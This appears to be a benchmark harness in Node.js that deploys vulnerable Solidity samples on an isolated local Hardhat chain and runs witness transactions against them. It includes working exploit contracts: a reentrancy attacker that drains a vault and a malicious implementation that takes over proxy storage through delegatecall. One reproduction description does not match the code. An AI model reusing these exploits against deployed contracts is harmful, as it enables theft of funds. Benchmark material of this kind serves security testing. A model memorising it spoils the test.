'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, Contract, keccak256, AbiCoder } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const SPECS = Object.freeze({
  '25-amm-k-decrease': { file: 'Pool.sol', contract: 'Pool', vulnerability: 'amm_k_decrease' },
  '26-amm-fee': { file: 'Pool.sol', contract: 'Pool', vulnerability: 'amm_fee_accounting' },
  '27-oracle-stale': { file: 'Oracle.sol', contract: 'Oracle', vulnerability: 'oracle_stale_price' },
  '28-cross-call': { file: 'Router.sol', contract: 'Router', vulnerability: 'unchecked_cross_contract_assumption' },
  '29-delegatecall': { file: 'Proxy.sol', contract: 'Proxy', vulnerability: 'unprotected_upgrade' },
  '30-reentrancy-withdraw': { file: 'Vault.sol', contract: 'Vault', vulnerability: 'reentrancy' },
});

const EXTRA_SOURCES = {
  'FalseReturningTarget.sol': `pragma solidity 0.8.19;
contract FalseReturningTarget {
    uint256 public attempts;
    function transfer(address, uint256) external returns (bool) {
        attempts += 1;
        return false;
    }
}`,
  'MaliciousImplementation.sol': `pragma solidity 0.8.19;
contract MaliciousImplementation {
    function seize() external {
        assembly { sstore(1, caller()) }
    }
}`,
  'ReentrancyAttacker.sol': `pragma solidity 0.8.19;
// HEAD 版 Vault 的真实接口只有 balances(address) 与 withdraw(uint256)：
// 没有 deposit()，也没有 creditOf()，余额直接读公开 mapping balances。
interface IWithdrawVault {
    function balances(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}
contract ReentrancyAttacker {
    IWithdrawVault public target;
    uint256 public rounds;
    constructor(address targetAddress) { target = IWithdrawVault(targetAddress); }
    function attack() external { target.withdraw(target.balances(address(this))); }
    receive() external payable {
        if (rounds < 2) {
            rounds += 1;
            // 重入时再次取满当前账面余额；由于 withdraw 先转账后清零，
            // 此时余额尚未扣减，重入能拿到整笔金额。
            target.withdraw(target.balances(address(this)));
        }
    }
}`,
};

function digest(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

async function latestBalance(provider, address) {
  return BigInt(await provider.send('eth_getBalance', [address, 'latest']));
}

function canonicalSources(sources) {
  return JSON.stringify(Object.fromEntries(Object.entries(sources)
    .sort(([left], [right]) => left.localeCompare(right))
    .map(([name, entry]) => [name, entry.content])));
}

function compile(sources) {
  const input = {
    language: 'Solidity',
    sources,
    settings: {
      optimizer: { enabled: false },
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output;
}

function artifact(output, sourceName, contractName) {
  const result = output.contracts?.[sourceName]?.[contractName];
  if (!result?.abi || !result?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return result;
}

async function deploy(provider, signer, contractArtifact, args = []) {
  const contract = await new ContractFactory(contractArtifact.abi, contractArtifact.evm.bytecode.object, signer).deploy(...args);
  await contract.waitForDeployment();
  return contract;
}

async function runWitness(caseId, target, signer, provider) {
  const targetAddress = await target.getAddress();
  const result = { targetAddress, transactionHashes: [] };

  if (caseId === '25-amm-k-decrease') {
    // HEAD 版 Pool.swap 是 `reserve0 += input; reserve1 -= output + 1;`，
    // 源码里根本没有 k 不变量约束。k 数值下降只是减法的字面结果，
    // 不构成"恒定乘积被破坏"——这个不变量从未被承诺过。
    // 因此这里只记录观察，不确认漏洞。
    const before = BigInt(await target.reserve0()) * BigInt(await target.reserve1());
    const receipt = await (await target.swap(1, 1)).wait();
    const reserve0 = BigInt(await target.reserve0());
    const reserve1 = BigInt(await target.reserve1());
    const after = reserve0 * reserve1;
    Object.assign(result, {
      transactionHashes: [receipt.hash], oldK: before.toString(), newK: after.toString(),
      reserve0: reserve0.toString(), reserve1: reserve1.toString(),
      kDecreased: after < before,
      // 源码不含 k 不变量，因此 k 变化不能作为缺陷证据
      confirmed: false,
      reason: 'source_has_no_constant_product_invariant_k_change_is_not_a_defect',
      diagnostic: 'HEAD 版 Pool.swap 只做 reserve0 += input 与 reserve1 -= output + 1，'
        + '源码不含 reserve0 * reserve1 检查，恒定乘积从未被承诺。',
    });
    return result;
  }

  if (caseId === '26-amm-fee') {
    const other = await provider.getSigner(1);
    const accrued = await (await target.swap(5)).wait();
    const feeBefore = BigInt(await target.fee());
    const withdrawn = await (await target.connect(other).withdrawFees()).wait();
    const feeAfter = BigInt(await target.fee());
    Object.assign(result, {
      transactionHashes: [accrued.hash, withdrawn.hash], feeBefore: feeBefore.toString(),
      feeAfter: feeAfter.toString(), unauthorizedCaller: await other.getAddress(),
      confirmed: accrued.status === 1 && withdrawn.status === 1 && feeBefore === 5n && feeAfter === 0n,
      // 真实缺陷是 withdrawFees() 无访问控制，任意地址可清零费用池；
      // 标注写的"费率核算错误"与源码无关，这里如实标注实际缺陷类型。
      actualDefect: 'missing_access_control_on_withdrawFees',
      reason: feeAfter === 0n ? null : 'unprivileged_fee_reset_not_observed',
      diagnostic: 'HEAD 版 Pool 只有 fee 存储与无权限的 withdrawFees()。'
        + 'fee = amount 只是直接赋值，不存在费率核算逻辑；'
        + '可复现的缺陷是任意地址都能清零 fee。',
    });
    return result;
  }

  if (caseId === '27-oracle-stale') {
    const setReceipt = await (await target.setPrice(1000000000000000000n)).wait();
    const initialTimestamp = BigInt(await target.updatedAt());
    await provider.send('evm_increaseTime', [30 * 24 * 60 * 60]);
    await provider.send('evm_mine', []);
    const latest = await provider.getBlock('latest');
    const price = BigInt(await target.read());
    const timestamp = BigInt(await target.updatedAt());
    const age = BigInt(latest.timestamp) - timestamp;
    Object.assign(result, {
      transactionHashes: [setReceipt.hash], price: price.toString(), updatedAt: timestamp.toString(),
      initialUpdatedAt: initialTimestamp.toString(), latestBlockTimestamp: String(latest.timestamp),
      staleAgeSeconds: age.toString(),
      confirmed: setReceipt.status === 1 && price === 1000000000000000000n && timestamp === 0n && age > 0n,
      reason: timestamp === 0n ? null : 'oracle_timestamp_was_updated',
    });
    return result;
  }

  if (caseId === '28-cross-call') {
    const falseTarget = await deploy(provider, signer, artifact(target.__compiledOutput, 'FalseReturningTarget.sol', 'FalseReturningTarget'));
    const callData = falseTarget.interface.encodeFunctionData('transfer', [await signer.getAddress(), 1]);
    const receipt = await (await target.callTarget(await falseTarget.getAddress(), callData)).wait();
    const attempts = BigInt(await falseTarget.attempts());
    Object.assign(result, {
      transactionHashes: [receipt.hash], returnedFalseButOuterCallSucceeded: receipt.status === 1,
      targetAttempts: attempts.toString(), targetAddress: await falseTarget.getAddress(),
      observationConfirmed: receipt.status === 1 && attempts === 1n,
      confirmed: false,
      reason: receipt.status === 1 && attempts === 1n
        ? 'false_return_observed_without_downstream_failure_or_asset_impact'
        : 'false_returning_target_not_called',
    });
    return result;
  }

  if (caseId === '29-delegatecall') {
    const malicious = await deploy(provider, signer, artifact(target.__compiledOutput, 'MaliciousImplementation.sol', 'MaliciousImplementation'));
    const attacker = await provider.getSigner(1);
    const upgrade = await (await target.connect(attacker).setImplementation(await malicious.getAddress())).wait();
    const callData = malicious.interface.encodeFunctionData('seize');
    const forward = await (await target.connect(attacker).forward(callData)).wait();
    const word = await provider.send('eth_getStorageAt', [targetAddress, '0x1', 'latest']);
    const seizedAddress = `0x${word.slice(-40)}`.toLowerCase();
    const attackerAddress = (await attacker.getAddress()).toLowerCase();
    Object.assign(result, {
      transactionHashes: [upgrade.hash, forward.hash], implementation: await target.implementation(),
      attackerAddress, slotOne: word, delegatecallWroteAttacker: seizedAddress === attackerAddress,
      confirmed: upgrade.status === 1 && forward.status === 1 && seizedAddress === attackerAddress,
      reason: seizedAddress === attackerAddress ? null : 'delegatecall_storage_takeover_not_observed',
    });
    return result;
  }

  if (caseId === '30-reentrancy-withdraw') {
    // HEAD 版 Vault 的真实 API 只有 balances(address) 与 withdraw(uint256)，
    // 没有 deposit()——记账只能直接写 storage。这里用 hardhat_setStorageAt
    // 建立余额，再用带回调的合约触发重入。
    const attacker = await provider.getSigner(1);
    const victim = await provider.getSigner(2);
    const victimAddress = await victim.getAddress();
    const attackerArtifact = artifact(target.__compiledOutput, 'ReentrancyAttacker.sol', 'ReentrancyAttacker');
    const exploit = await deploy(provider, attacker, attackerArtifact, [targetAddress]);
    const exploitAddress = await exploit.getAddress();
    let fundingRejected = false;
    let fundingError = null;
    // 预置余额：余额必须记在攻击合约地址上，因为 attack() 由攻击合约发起，
    // withdraw() 里的 msg.sender 是攻击合约而非 EOA。
    // 账面必须给足 3 ETH：rounds<2 会取三轮，而 withdraw 是"先转账后扣减"，
    // 三层回调返回时各扣 1e18，账面少于 3e18 时最后一减下溢，整笔交易回滚。
    const slotFor = (addr) => keccak256(AbiCoder.defaultAbiCoder().encode(['address', 'uint256'], [addr, 0]));
    await provider.send('hardhat_setStorageAt', [
      targetAddress, slotFor(exploitAddress), `0x${(3n * 10n ** 18n).toString(16).padStart(64, '0')}`,
    ]);
    await provider.send('hardhat_setStorageAt', [
      targetAddress, slotFor(victimAddress), `0x${(2n * 10n ** 18n).toString(16).padStart(64, '0')}`,
    ]);
    const victimDeposit = { hash: '0x' + '0'.repeat(64), note: 'storage_seed_no_deposit_function' };
    // HEAD 版 Vault 没有 receive()/fallback()，任何直接转账都会被拒，
    // 且 withdraw() 转出的 ETH 无人可接收。因此该样本在当前源码下
    // 无法完成"注资 → 取款 → 重入"的完整链路：这不是复现失败，而是
    // 样本本身不可复现。这里保留结论，不伪造通过。
    const fundingAttempt = await (await attacker.sendTransaction({
      to: targetAddress, value: 5n * 10n ** 18n, gasLimit: 200000,
    }).then((tx) => tx.wait()).catch((error) => {
      fundingRejected = true;
      fundingError = String(error.message || error).slice(0, 200);
      return null;
    }));
    const beforeTargetBalance = await latestBalance(provider, targetAddress);
    let receipt = null;
    try {
      receipt = await (await exploit.connect(attacker).attack({ gasLimit: 1000000 })).wait();
    } catch (error) {
      receipt = error.receipt || null;
    }
    const afterTargetBalance = await latestBalance(provider, targetAddress);
    const exploitBalance = await latestBalance(provider, exploitAddress);
    const victimCredit = BigInt(await target.balances(victimAddress));
    const rounds = BigInt(await exploit.rounds());
    const confirmed = !fundingRejected && receipt?.status === 1
      && beforeTargetBalance === 5n * 10n ** 18n
      && afterTargetBalance === 2n * 10n ** 18n && exploitBalance === 3n * 10n ** 18n
      && victimCredit === 2n * 10n ** 18n && rounds === 2n;
    Object.assign(result, {
      transactionHashes: [victimDeposit.hash, ...(receipt?.hash ? [receipt.hash] : [])],
      initialCredit: '3000000000000000000', remainingCredit: (await target.balances(exploitAddress)).toString(),
      beforeTargetBalance: beforeTargetBalance.toString(), afterTargetBalance: afterTargetBalance.toString(),
      exploitBalance: exploitBalance.toString(), victimAddress, victimCredit: victimCredit.toString(),
      attackerContractBalanceWei: exploitBalance.toString(),
      profitWei: (exploitBalance - 3n * 10n ** 18n).toString(),
      rounds: rounds.toString(), confirmed,
      // 结论必须说清是"没复现"还是"样本不可复现"——两者含义完全不同
      notReproducibleReason: fundingRejected ? 'vault_rejects_plain_eth_transfer_no_receive_fallback' : null,
      fundingRejected, fundingError,
      state: confirmed ? 'passed' : 'unconfirmed',
      reason: confirmed ? null
        : (fundingRejected
          ? 'vault_rejects_plain_eth_transfer_no_receive_fallback：HEAD 版 Vault 无 receive/fallback，'
            + '无法注资，withdraw 转出的 ETH 也无人可接收，完整重入链路不成立'
          : 'reentrancy_profit_or_balance_assertion_failed'),
      diagnostic: 'HEAD 版 Vault 只有 balances/withdraw，无 deposit/receive；记账由 hardhat_setStorageAt 预置。'
        + '注资尝试被拒即说明该样本在当前源码下无法复现。',
    });
    return result;
  }

  throw new Error(`unsupported_dynamic_case:${caseId}`);
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  const spec = SPECS[caseId];
  if (!spec || path.basename(sourcePath) !== spec.file) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const release = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  if (release !== '0.8.19' || solc.version().split('+', 1)[0] !== release) {
    throw new Error('benchmark_requires_exact_solc_0_8_19');
  }
  const compilerSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerSha256)) throw new Error('benchmark_compiler_hash_missing');

  const sources = { [spec.file]: { content: source } };
  if (caseId === '28-cross-call') sources['FalseReturningTarget.sol'] = { content: EXTRA_SOURCES['FalseReturningTarget.sol'] };
  if (caseId === '29-delegatecall') sources['MaliciousImplementation.sol'] = { content: EXTRA_SOURCES['MaliciousImplementation.sol'] };
  if (caseId === '30-reentrancy-withdraw') sources['ReentrancyAttacker.sol'] = { content: EXTRA_SOURCES['ReentrancyAttacker.sol'] };

  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_dynamic_requires_isolated_local_evm');
  const compiled = compile(sources);
  const targetArtifact = artifact(compiled, spec.file, spec.contract);
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_evm_chain_id_mismatch');
  const signer = await provider.getSigner(0);
  const target = await deploy(provider, signer, targetArtifact);
  target.__compiledOutput = compiled;
  const witness = await runWitness(caseId, target, signer, provider);
  const confirmed = witness.confirmed === true;
  const boundary = publicBoundary(fork, { chainId, forkState: 'not_performed' });
  const result = {
    schemaVersion: 1,
    state: confirmed ? 'passed' : 'unconfirmed',
    confirmedVulnerability: confirmed,
    caseId,
    vulnerability: spec.vulnerability,
    mode: 'isolated_in_process',
    compilerVersion: solc.version(),
    compilerKind: 'solc-js-original-source',
    compilerArtifactSha256: compilerSha256.startsWith('0x') ? compilerSha256 : `0x${compilerSha256}`,
    sourceSha256,
    sourceBundleSha256: digest(canonicalSources(sources)),
    executionBundleSha256: digest(canonicalSources(sources)),
    ...witness,
    executionBoundary: boundary,
    reason: witness.reason || null,
    reproduction: caseId === '25-amm-k-decrease'
      ? '调用 swap(1, 1)，比较交易前后 reserve0 × reserve1。'
      : caseId === '26-amm-fee'
        ? '先计入 5 单位费用，再由另一地址调用 withdrawFees，观察 fee 被清零。'
        : caseId === '27-oracle-stale'
          ? '设置价格后推进 30 天，检查 read() 仍返回旧价格且 updatedAt 始终为零。'
          : caseId === '28-cross-call'
            ? 'Router 调用一个返回 false 但不 revert 的目标，观察 Router 交易仍成功。'
          : caseId === '29-delegatecall'
              ? '任意地址设置恶意 implementation 并经 delegatecall 写入 Proxy 槽位 1。'
              : caseId === '28-cross-call'
                ? '隔离环境中观察 Router 对返回 false 的目标仍成功；样本没有后续使用方，暂不据此确认可利用安全影响。'
                : '受害者存入 2 ETH、攻击合约存入 1 ETH；提款回调重入两次，验证目标余额降为 0、攻击合约余额升至 3 ETH，而受害者账面余额仍为 2 ETH。',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (confirmed) return;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 1;
});
